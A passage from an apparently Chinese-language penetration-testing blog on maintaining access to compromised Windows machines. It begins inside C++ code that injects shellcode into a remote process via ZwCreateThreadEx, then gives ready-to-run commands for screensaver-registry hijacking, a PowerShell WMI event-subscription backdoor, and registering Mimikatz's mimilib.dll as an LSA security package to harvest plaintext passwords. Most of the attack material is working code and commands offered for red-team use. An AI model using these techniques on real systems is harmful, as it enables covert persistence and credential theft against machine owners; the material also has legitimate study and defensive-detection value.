</span></span><span style="display:flex;"><span> <span style="color:#828b96;font-style:italic">//Sleep(3000);
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span> <span style="color:#58a1dd">VirtualProtectEx</span>(<span style="color:#58a1dd">hHandle</span>, <span style="color:#58a1dd">Memory</span>, <span style="color:#58a1dd">shellcode_size</span> <span style="color:#ff636f">/</span> <span style="color:#a6be9d">3</span>, <span style="color:#58a1dd">PAGE_EXECUTE</span>, <span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">dwOldProtect</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">HMODULE</span> <span style="color:#58a1dd">hNtdll</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">LoadLibrary</span>(<span style="color:#a6be9d">L</span><span style="color:#a6be9d">&#34;ntdll.dll&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">hNtdll</span> <span style="color:#ff636f">==</span> <span style="color:#58a1dd">NULL</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">printf</span>(<span style="color:#a6be9d">&#34;[!] LoadNTdll Error,Error is:%d</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">&#34;</span>, <span style="color:#58a1dd">GetLastError</span>());
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">return</span> <span style="color:#58a1dd">FALSE</span>;
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">else</span>
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">printf</span>(<span style="color:#a6be9d">&#34;[*] Load ntdll.dll Successfully!</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">&#34;</span>);
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#828b96;font-style:italic">#ifdef _WIN64
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span> <span style="color:#ff636f">typedef</span> <span style="color:#58a1dd">DWORD</span>(<span style="color:#58a1dd">WINAPI</span><span style="color:#ff636f">*</span> <span style="color:#58a1dd">typedef_ZwCreateThreadEx</span>)(
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">PHANDLE</span> <span style="color:#58a1dd">ThreadHandle</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">ACCESS_MASK</span> <span style="color:#58a1dd">DesiredAccess</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">LPVOID</span> <span style="color:#58a1dd">ObjectAttributes</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">HANDLE</span> <span style="color:#58a1dd">ProcessHandle</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">LPTHREAD_START_ROUTINE</span> <span style="color:#58a1dd">lpStartAddress</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">LPVOID</span> <span style="color:#58a1dd">lpParameter</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">ULONG</span> <span style="color:#58a1dd">CreateThreadFlags</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">SIZE_T</span> <span style="color:#58a1dd">ZeroBits</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">SIZE_T</span> <span style="color:#58a1dd">StackSize</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">SIZE_T</span> <span style="color:#58a1dd">MaximumStackSize</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">LPVOID</span> <span style="color:#58a1dd">pUnkown</span>
</span></span><span style="display:flex;"><span> );
</span></span><span style="display:flex;"><span> <span style="color:#828b96;font-style:italic">#else
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span> <span style="color:#ff636f">typedef</span> <span style="color:#58a1dd">DWORD</span>(<span style="color:#58a1dd">WINAPI</span><span style="color:#ff636f">*</span> <span style="color:#58a1dd">typedef_ZwCreateThreadEx</span>)(
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">PHANDLE</span> <span style="color:#58a1dd">ThreadHandle</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">ACCESS_MASK</span> <span style="color:#58a1dd">DesiredAccess</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">LPVOID</span> <span style="color:#58a1dd">ObjectAttributes</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">HANDLE</span> <span style="color:#58a1dd">ProcessHandle</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">LPTHREAD_START_ROUTINE</span> <span style="color:#58a1dd">lpStartAddress</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">LPVOID</span> <span style="color:#58a1dd">lpParameter</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">BOOL</span> <span style="color:#58a1dd">CreateSuspended</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">dwStackSize</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">dw1</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">dw2</span>,
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">LPVOID</span> <span style="color:#58a1dd">pUnkown</span>
</span></span><span style="display:flex;"><span> );
</span></span><span style="display:flex;"><span> <span style="color:#828b96;font-style:italic">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span> <span style="color:#58a1dd">typedef_ZwCreateThreadEx</span> <span style="color:#58a1dd">ZwCreateThreadEx</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">NULL</span>;
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">ZwCreateThreadEx</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">typedef_ZwCreateThreadEx</span>)<span style="color:#ff636f">::</span><span style="color:#58a1dd">GetProcAddress</span>(<span style="color:#58a1dd">hNtdll</span>, <span style="color:#a6be9d">&#34;ZwCreateThreadEx&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">ZwCreateThreadEx</span> <span style="color:#ff636f">==</span> <span style="color:#58a1dd">NULL</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">printf</span>(<span style="color:#a6be9d">&#34;[!] Get ZwCreateThreadEx Address Error,Error is:%d</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">&#34;</span>, <span style="color:#58a1dd">GetLastError</span>());
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">return</span> <span style="color:#58a1dd">FALSE</span>;
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">else</span>
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">printf</span>(<span style="color:#a6be9d">&#34;[*] Get ZwCreateThreadEx Address Successfully! Address is %x</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">&#34;</span>, <span style="color:#58a1dd">ZwCreateThreadEx</span>);
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">HANDLE</span> <span style="color:#58a1dd">hRemoteThread</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">NULL</span>;
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">ZwRet</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">0</span>;
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">ZwRet</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">ZwCreateThreadEx</span>(<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">hRemoteThread</span>, <span style="color:#58a1dd">PROCESS_ALL_ACCESS</span>, <span style="color:#58a1dd">NULL</span>, <span style="color:#58a1dd">hHandle</span>,
</span></span><span style="display:flex;"><span> (<span style="color:#58a1dd">LPTHREAD_START_ROUTINE</span>)<span style="color:#58a1dd">Memory</span>, <span style="color:#58a1dd">NULL</span>, <span style="color:#a6be9d">0</span>, <span style="color:#a6be9d">0</span>, <span style="color:#a6be9d">0</span>, <span style="color:#a6be9d">0</span>, <span style="color:#58a1dd">NULL</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">hRemoteThread</span> <span style="color:#ff636f">==</span> <span style="color:#58a1dd">NULL</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">printf</span>(<span style="color:#a6be9d">&#34;[!] Creat RemoteThread Error,Error is:%d</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">&#34;</span>, <span style="color:#58a1dd">GetLastError</span>());
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">getchar</span>();
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">VirtualFreeEx</span>(<span style="color:#58a1dd">hHandle</span>, <span style="color:#58a1dd">Memory</span>, <span style="color:#a6be9d">0</span>, <span style="color:#58a1dd">MEM_RELEASE</span>);
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">CloseHandle</span>(<span style="color:#58a1dd">hHandle</span>);
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">FreeLibrary</span>(<span style="color:#58a1dd">hNtdll</span>);
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">return</span> <span style="color:#58a1dd">FALSE</span>;
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">WaitForSingleObject</span>(<span style="color:#58a1dd">hRemoteThread</span>, <span style="color:#58a1dd">INFINITE</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#ff636f">return</span> <span style="color:#58a1dd">TRUE</span>;
</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><h1 id="屏幕保护程序" class="heading-element"><span>屏幕保护程序</span>
  <a href="#%e5%b1%8f%e5%b9%95%e4%bf%9d%e6%8a%a4%e7%a8%8b%e5%ba%8f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p><strong>利用前提:对方开启了屏幕保护</strong></p>
<p>屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。</p>
<p>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的，攻击者可以利用屏幕保护程序来隐藏shell，达到一定的权限维持。</p>
<p>注册表位置:</p>
<pre tabindex="0"><code>HKEY_CURRENT_USER\Control Panel\Desktop</code></pre><p>命令行修改:</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span> <span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">add</span> <span style="color:#a6be9d">&#34;HKEY_CURRENT_USER\Control Panel\Desktop&#34;</span> /<span style="color:#58a1dd">v</span> <span style="color:#58a1dd">SCRNSAVE</span>.<span style="color:#58a1dd">EXE</span> /<span style="color:#58a1dd">d</span> <span style="color:#58a1dd">C:</span>\<span style="color:#58a1dd">Windows</span>\<span style="color:#58a1dd">System32</span>\<span style="color:#58a1dd">cmd</span>.<span style="color:#58a1dd">exe</span>
</span></span><span style="display:flex;"><span> <span style="color:#58a1dd">New-ItemProperty</span> <span style="color:#58a1dd">-Path</span> <span style="color:#a6be9d">&#39;HKCU:\Control Panel\Desktop\&#39;</span> <span style="color:#58a1dd">-Name</span> <span style="color:#a6be9d">&#39;SCRNSAVE.EXE&#39;</span> <span style="color:#58a1dd">-Value</span> <span style="color:#a6be9d">&#39;c:\tmp\pentestlab.exe&#39;</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/640-20210706202127819.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706202127819.png" alt="图片" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706202127819.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706202127819.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706202127819.png?size=large 2x" data-title="图片" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>这里可以改成我们的马，达到维持权限的效果,具体时间为注册表的ScreenSaverTimeout值有关</p>
<h1 id="wmi构造无文件后门" class="heading-element"><span>WMI构造无文件后门</span>
  <a href="#wmi%e6%9e%84%e9%80%a0%e6%97%a0%e6%96%87%e4%bb%b6%e5%90%8e%e9%97%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>WMI是一项Windows管理技术，其全称是Windows Management Instrumentation，即Windows管理规范。大多数基于Windows的软件依赖于此服务。</p>
<p>无文件无进程使得他非常隐蔽成为后门，但由于他的隐蔽性现在被大多数杀软所查杀。</p>
<p>通过与Powershell命令配合使用可以实现无文件，具有良好的隐蔽性也是目前较为常用的持久化手段。</p>
<p>推荐文章</p>
<blockquote>
<p>[https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html](<a href="https://wooyun.js.org/drops/WMI"target="_blank" rel="external nofollow noopener noreferrer">https://wooyun.js.org/drops/WMI</a> 的攻击，防御与取证分析技术之攻击篇.html)</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">$filterName</span> = <span style="color:#a6be9d">&#39;SD&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$consumerName</span> = <span style="color:#a6be9d">&#39;SDD&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$exePath</span> = <span style="color:#a6be9d">&#39;C:\Windows\System32\cmd.exe&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$Query</span> = <span style="color:#a6be9d">&#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39; AND TargetInstance.SystemUpTime &gt;=200 AND TargetInstance.SystemUpTime &lt; 320&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$WMIEventFilter</span> = <span style="color:#58a1dd">Set-WmiInstance</span> <span style="color:#58a1dd">-Class</span> <span style="color:#58a1dd">__EventFilter</span> <span style="color:#58a1dd">-NameSpace</span> <span style="color:#a6be9d">&#34;root\subscription&#34;</span> <span style="color:#58a1dd">-Arguments</span> <span style="color:#58a1dd">@</span>{<span style="color:#58a1dd">Name</span>=<span style="color:#58a1dd">$filterName</span>;<span style="color:#58a1dd">EventNameSpace</span>=<span style="color:#a6be9d">&#34;root\cimv2&#34;</span>;<span style="color:#58a1dd">QueryLanguage</span>=<span style="color:#a6be9d">&#34;WQL&#34;</span>;<span style="color:#58a1dd">Query</span>=<span style="color:#58a1dd">$Query</span>} <span style="color:#58a1dd">-ErrorAction</span> <span style="color:#58a1dd">Stop</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$WMIEventConsumer</span> = <span style="color:#58a1dd">Set-WmiInstance</span> <span style="color:#58a1dd">-Class</span> <span style="color:#58a1dd">CommandLineEventConsumer</span> <span style="color:#58a1dd">-Namespace</span> <span style="color:#a6be9d">&#34;root\subscription&#34;</span> <span style="color:#58a1dd">-Arguments</span> <span style="color:#58a1dd">@</span>{<span style="color:#58a1dd">Name</span>=<span style="color:#58a1dd">$consumerName</span>;<span style="color:#58a1dd">ExecutablePath</span>=<span style="color:#58a1dd">$exePath</span>;<span style="color:#58a1dd">CommandLineTemplate</span>=<span style="color:#58a1dd">$exePath</span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Set-WmiInstance</span> <span style="color:#58a1dd">-Class</span> <span style="color:#58a1dd">__FilterToConsumerBinding</span> <span style="color:#58a1dd">-Namespace</span> <span style="color:#a6be9d">&#34;root\subscription&#34;</span> <span style="color:#58a1dd">-Arguments</span> <span style="color:#58a1dd">@</span>{<span style="color:#ff636f">Filter</span>=<span style="color:#58a1dd">$WMIEventFilter</span>;<span style="color:#58a1dd">Consumer</span>=<span style="color:#58a1dd">$WMIEventConsumer</span>}</span></span></code></pre></div><p>可以使用Autoruns进行查看</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/640-20210706204240545.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706204240545.png" alt="图片" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706204240545.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706204240545.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/640-20210706204240545.png?size=large 2x" data-title="图片" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h1 id="安全支持提供者" class="heading-element"><span>安全支持提供者</span>
  <a href="#%e5%ae%89%e5%85%a8%e6%94%af%e6%8c%81%e6%8f%90%e4%be%9b%e8%80%85" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>安全支持提供程序（SSP）是Windows API，用于扩展Windows身份验证机制。LSASS进程正在Windows启动期间加载安全支持提供程序DLL。这种行为使红队的攻击者可以删除一个任意的SSP DLL以便与LSASS进程进行交互并记录该进程中存储的所有密码，或者直接用恶意的SSP对该进程进行修补而无需接触磁盘。</p>
<p>该技术可用于收集一个系统或多个系统中的凭据，并将这些凭据与另一个协议（例如RDP，WMI等）结合使用，以免干扰检测，从而在网络中保持持久性。向主机注入恶意安全支持提供程序需要管理员级别的特权，并且可以使用两种方法：</p>
<ol>
<li>注册SSP DLL</li>
<li>加载到内存</li>
</ol>
<p>Mimikatz，Empire和PowerSploit支持这两种方法，可以在红队操作中使用。</p>
<h3 id="mimikatz" class="heading-element"><span>Mimikatz</span>
  <a href="#mimikatz" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="方法一" class="heading-element"><span>方法一</span>
  <a href="#%e6%96%b9%e6%b3%95%e4%b8%80" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>项目<a href="https://github.com/gentilkiwi/mimikatz/releases"target="_blank" rel="external nofollow noopener noreferrer">Mimikatz</a>提供了一个DLL文件（mimilib.dll），可以将其放到与LSASS进程（System32 ）相同的位置，以便为访问受感染主机的任何用户获得纯文本凭据。</p>
<p>将文件传输到<code>C:\Windows\System32\</code>位置后，需要修改注册表项以包括新的安全支持提供程序<code>mimilib</code>。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">add</span> <span style="color:#a6be9d">&#34;hklm\system\currentcontrolset\control\lsa\&#34;</span> /<span style="color:#58a1dd">v</span> <span style="color:#a6be9d">&#34;Security Packages&#34;</span> /<span style="color:#58a1dd">d</span> <span style="color:#a6be9d">&#34;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&#34;</span> /<span style="color:#58a1dd">t</span> <span style="color:#58a1dd">REG_MULTI_SZ</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111133557520-730469174.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133557520-730469174.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133557520-730469174.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133557520-730469174.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111133557520-730469174.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" 